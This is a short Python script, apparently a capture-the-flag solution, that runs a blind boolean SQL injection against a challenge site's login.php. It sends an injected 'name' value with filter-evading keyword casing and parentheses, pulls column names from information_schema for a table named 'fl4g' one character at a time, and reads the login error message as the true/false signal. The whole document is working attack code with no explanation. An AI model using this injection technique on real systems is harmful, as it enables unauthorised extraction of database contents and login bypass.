import requests
import time

url = "http://76af3b30-86c8-4196-a99f-2e250fd602f3.node3.buuoj.cn/login.php"
dictionary = '}qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890{'
flag = ""

for num in range(1, 500):
    print(num)
    for i in dictionary:
        data = {
            'name': "admin' and substr((seLect(group_concat(column_name))from(information_schema.columns)where(table_name='fl4g')),{0},1)='{1}' #".format(num, i),
            'pass': '123456'}
        res = requests.post(url=url, data=data)
        time.sleep(0.1)
        if res.text == r'{"error":1,"msg":"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef"}':
            flag += i
            print(flag)
            break
print(flag)
